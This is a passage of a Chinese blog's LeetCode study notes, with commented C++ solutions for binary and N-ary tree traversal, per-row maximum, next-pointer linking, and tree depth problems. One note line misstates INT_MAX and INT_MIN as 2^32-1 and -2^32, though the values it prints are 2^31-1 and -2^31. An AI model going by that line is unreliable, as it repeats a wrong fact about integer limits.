class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="429-N-叉树的层序遍历"><a href="#429-N-叉树的层序遍历" class="headerlink" title="429 N 叉树的层序遍历"></a>429 N 叉树的层序遍历</h3><p>给定一个 N 叉树，返回其节点值的层序遍历。（即从左到右，逐层遍历）。<br>树的序列化输入是用层序遍历，每组子节点都由 null 值分隔（参见示例）。<br><strong>区别：多个孩子加入队列</strong> vector&lt;Node*&gt; children;</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">class Node &#123;</span></span><br><span class="line"><span class="comment">public:</span></span><br><span class="line"><span class="comment">    int val;</span></span><br><span class="line"><span class="comment">    vector&lt;Node*&gt; children;//注意！！！！！</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Node() &#123;&#125;</span></span><br><span class="line"><span class="comment">    Node(int _val) &#123;</span></span><br><span class="line"><span class="comment">        val = _val;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    Node(int _val, vector&lt;Node*&gt; _children) &#123;</span></span><br><span class="line"><span class="comment">        val = _val;</span></span><br><span class="line"><span class="comment">        children = _children;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">levelOrder</span>(Node* root) &#123;</span><br><span class="line">        queue&lt;Node*&gt; que;</span><br><span class="line">        <span class="keyword">if</span>(root)</span><br><span class="line">            que.<span class="built_in">push</span>(root);</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="keyword">while</span>(!que.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="keyword">int</span> size = que.<span class="built_in">size</span>();<span class="comment">//本层 结点个数</span></span><br><span class="line">            vector&lt;<span class="keyword">int</span>&gt; vec;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)&#123;</span><br><span class="line">                Node *node = que.<span class="built_in">front</span>();</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                vec.<span class="built_in">push_back</span>(node-&gt;val);<span class="comment">//装入</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;node-&gt;children.<span class="built_in">size</span>();i++)&#123;<span class="comment">//将本结点 所有孩子入队</span></span><br><span class="line">                    <span class="keyword">if</span>(node-&gt;children[i])</span><br><span class="line">                        que.<span class="built_in">push</span>(node-&gt;children[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            res.<span class="built_in">push_back</span>(vec);<span class="comment">//装入</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="590-N-叉树的后序遍历"><a href="#590-N-叉树的后序遍历" class="headerlink" title="590 N 叉树的后序遍历"></a>590 N 叉树的后序遍历</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    递归</span></span><br><span class="line"><span class="comment">    O(m)，其中 m 为 N 叉树的节点</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">preorder_N</span><span class="params">(Node *root,vector&lt;<span class="keyword">int</span>&gt;&amp; res)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;root-&gt;children.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(root-&gt;children[i])</span><br><span class="line">                <span class="built_in">preorder_N</span>(root-&gt;children[i],res);<span class="comment">//孩子</span></span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="built_in">push_back</span>(root-&gt;val);<span class="comment">//根</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">postorder</span><span class="params">(Node* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="built_in">preorder_N</span>(root,res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt;&amp; <span class="title">postorder</span><span class="params">(Node* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!root) <span class="keyword">return</span> ans;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">const</span> <span class="keyword">auto</span>&amp; c : root-&gt;children) </span><br><span class="line">            <span class="built_in">postorder</span>(c);</span><br><span class="line">        ans.<span class="built_in">emplace_back</span>(root-&gt;val);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="589-N-叉树的前序遍历"><a href="#589-N-叉树的前序遍历" class="headerlink" title="589 N 叉树的前序遍历"></a>589 N 叉树的前序遍历</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    递归</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">preorder_N</span><span class="params">(Node* root, vector&lt;<span class="keyword">int</span>&gt;&amp; res)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        res.<span class="built_in">push_back</span>(root-&gt;val);<span class="comment">//根</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;root-&gt;children.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(root-&gt;children[i])&#123;</span><br><span class="line">                <span class="built_in">preorder_N</span>(root-&gt;children[i],res);<span class="comment">//孩子</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">preorder</span><span class="params">(Node* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="built_in">preorder_N</span>(root,res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//迭代</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">preorder</span><span class="params">(Node* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        stack&lt;Node *&gt; st;</span><br><span class="line">        st.<span class="built_in">emplace</span>(root);</span><br><span class="line">        <span class="keyword">while</span>(!st.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            Node * node = st.<span class="built_in">top</span>();</span><br><span class="line">            st.<span class="built_in">pop</span>();</span><br><span class="line">            res.<span class="built_in">emplace_back</span>(node-&gt;val);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> it = node-&gt;children.<span class="built_in">rbegin</span>(); it != node-&gt;children.<span class="built_in">rend</span>(); it++) &#123;</span><br><span class="line">                st.<span class="built_in">emplace</span>(*it);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="515-在每个树行中找最大值"><a href="#515-在每个树行中找最大值" class="headerlink" title="515 在每个树行中找最大值"></a>515 在每个树行中找最大值</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    在每次弹出时求 直接更新最大值</span></span><br><span class="line"><span class="comment">    也可以 写个函数求最大值</span></span><br><span class="line"><span class="comment">    INT_MAX表示正无穷   INT_MIN表示负无穷 </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">largestValues</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; que;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">NULL</span>) que.<span class="built_in">push</span>(root);</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="keyword">while</span> (!que.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">int</span> size = que.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">int</span> maxValue = INT_MIN; <span class="comment">//取每一层的最大值</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                TreeNode* node = que.<span class="built_in">front</span>();</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                maxValue = node-&gt;val&gt;maxValue?node-&gt;val:maxValue;</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;left) que.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;right) que.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">            result.<span class="built_in">push_back</span>(maxValue); <span class="comment">//把最大值放进数组</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="116-填充每个节点的下一个右侧节点指针"><a href="#116-填充每个节点的下一个右侧节点指针" class="headerlink" title="116 填充每个节点的下一个右侧节点指针"></a>116 填充每个节点的下一个右侧节点指针</h3><p>给定一个 完美二叉树 ，其所有叶子节点都在同一层，每个父节点都有两个子节点。二叉树定义如下：</p><pre><code>struct Node &#123;int val;Node *left;Node *right;Node *next;&#125;</code></pre><p>填充它的每个 next 指针，让这个指针【指向其下一个右侧节点】<br>【层序遍历】如果找不到下一个右侧节点，则将 next 指针设置为 NULL。<br>初始状态下，所有 next 指针都被设置为 NULL。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//层序遍历</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">Node* <span class="title">connect</span><span class="params">(Node* root)</span> </span>&#123;</span><br><span class="line">        queue&lt;Node*&gt; que;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">NULL</span>) que.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span> (!que.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">int</span> size = que.<span class="built_in">size</span>();</span><br><span class="line">            Node* nodePre;<span class="comment">//注意：前驱结点</span></span><br><span class="line">            Node* node;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;<span class="comment">//遍历每层</span></span><br><span class="line">                <span class="keyword">if</span> (i==<span class="number">0</span>) &#123;<span class="comment">//第一个结点：根结点</span></span><br><span class="line">                    nodePre = que.<span class="built_in">front</span>(); <span class="comment">// 取出一层的头结点</span></span><br><span class="line">                    que.<span class="built_in">pop</span>();</span><br><span class="line">                    node = nodePre;<span class="comment">//注意：一定得给node赋值</span></span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    node = que.<span class="built_in">front</span>();</span><br><span class="line">                    que.<span class="built_in">pop</span>();</span><br><span class="line">                    nodePre-&gt;next = node; <span class="comment">//本层前一个节点next指向本节点</span></span><br><span class="line">                    nodePre = nodePre-&gt;next;<span class="comment">//更新nodePre</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;left) </span><br><span class="line">                    que.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;right) </span><br><span class="line">                    que.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">            nodePre-&gt;next = <span class="literal">NULL</span>; <span class="comment">//本层最后一个节点指向NULL</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="104-二叉树的最大深度"><a href="#104-二叉树的最大深度" class="headerlink" title="104 二叉树的最大深度"></a>104 二叉树的最大深度</h3><p>给定一个二叉树，找出其最大深度。</p><ul><li><strong>二叉树的深度</strong>: 【根节点】到【最远叶子节点】的最长路径上的节点数。</li><li><strong>二叉树节点的深度</strong>：指从【根节点】到【该节点】的最长简单路径边的条数或者节点数（取决于深度从0开始还是从1开始）</li><li><strong>二叉树节点的高度</strong>：指从【该节点】到【叶子节点】的最长简单路径边的条数或者节点数（取决于高度从0开始还是从1开始）</li></ul><p><strong>【根节点的高度】就是【二叉树的最大深度】</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    深度优先搜索【根节点的高度】</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(<span class="built_in">maxDepth</span>(root-&gt;left),<span class="built_in">maxDepth</span>(root-&gt;right))+<span class="number">1</span>;<span class="comment">//可以直接return </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    int leftdepth = getdepth(node-&gt;left); //左子树深度</span></span><br><span class="line"><span class="comment">    int rightdepth = getdepth(node-&gt;right); //右子树深度</span></span><br><span class="line"><span class="comment">    int depth = 1 + max(leftdepth, rightdepth); //结点深度</span></span><br><span class="line"><span class="comment">    return depth;   </span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//深度优先遍历：分开写，便于理解</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;left == <span class="literal">nullptr</span> &amp;&amp; root-&gt;right == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> max_depth = INT_MIN;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;left != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            max_depth = <span class="built_in">max</span>(<span class="built_in">maxDepth</span>(root-&gt;left), max_depth);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;right != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            max_depth = <span class="built_in">max</span>(<span class="built_in">maxDepth</span>(root-&gt;right), max_depth);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max_depth + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    广度优先遍历：队列</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; que;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">NULL</span>) </span><br><span class="line">            que.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">int</span> depth = <span class="number">0</span>;<span class="comment">//记录深度</span></span><br><span class="line">        <span class="keyword">while</span> (!que.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">int</span> size = que.<span class="built_in">size</span>();<span class="comment">//该层个数</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                TreeNode *node = que.<span class="built_in">front</span>();</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;left) </span><br><span class="line">                    que.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;right) </span><br><span class="line">                    que.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">            depth++;<span class="comment">//遍历一层，depth++</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> depth;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="559-N-叉树的最大深度"><a href="#559-N-叉树的最大深度" class="headerlink" title="559 N 叉树的最大深度"></a>559 N 叉树的最大深度</h3><p>给定一个 N 叉树，找到其最大深度。<br>最大深度是指从根节点到最远叶子节点的最长路径上的节点总数。<br>N 叉树输入按层序遍历序列化表示，每组子节点由空值分隔（请参见示例）。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//递归</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">Depth</span><span class="params">(Node *root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> depth = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;root-&gt;children.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(root-&gt;children[i])</span><br><span class="line">                depth = <span class="built_in">max</span>(<span class="built_in">Depth</span>(root-&gt;children[i]),depth);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> depth+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(Node* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Depth</span>(root);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    迭代-队列</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(Node* root)</span> </span>&#123;</span><br><span class="line">        queue&lt;Node*&gt; que;</span><br><span class="line">        <span class="keyword">if</span>(root)</span><br><span class="line">            que.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">int</span> depth = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(!que.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="keyword">int</span> size = que.<span class="built_in">size</span>();<span class="comment">//本层结点个数</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)&#123;</span><br><span class="line">                Node *node = que.<span class="built_in">front</span>();</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;node-&gt;children.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(node-&gt;children[i])</span><br><span class="line">                        que.<span class="built_in">push</span>(node-&gt;children[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            depth++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> depth;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="111-二叉树的最小深度"><a href="#111-二叉树的最小深度" class="headerlink" title="111 二叉树的最小深度"></a>111 二叉树的最小深度</h3><p>给定一个二叉树，找出其<strong>最小深度</strong>。<br>最小深度是从根节点到<strong>最近</strong>叶子节点的最短路径上的节点数量。<br>说明：叶子节点是指没有子节点的节点。<br>INT_MAX=2^32-1=2147483647<br>INT_MIN=-2^32=-2147483648</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 